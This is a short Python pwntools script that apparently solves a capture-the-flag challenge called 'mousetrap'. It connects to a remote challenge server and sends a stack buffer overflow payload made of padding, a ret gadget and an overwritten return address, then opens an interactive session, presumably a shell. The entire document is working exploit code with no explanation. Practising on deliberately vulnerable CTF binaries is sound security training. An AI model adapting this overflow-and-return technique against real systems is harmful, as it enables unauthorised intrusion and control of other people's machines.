from pwn import *

#p = process("./mousetrap")
p = remote("cha.hackpack.club", 41719)

padd1 = "a" * 25
addr = p64(0x400717)
ret = p64(0x00000000004005b6)


payload = "AAAAAAAA"
payload += p64(0)
payload += "a" * 280
payload += ret
payload += addr
p.sendlineafter("Name:",padd1)
p.sendlineafter("2657: ",payload)
p.interactive()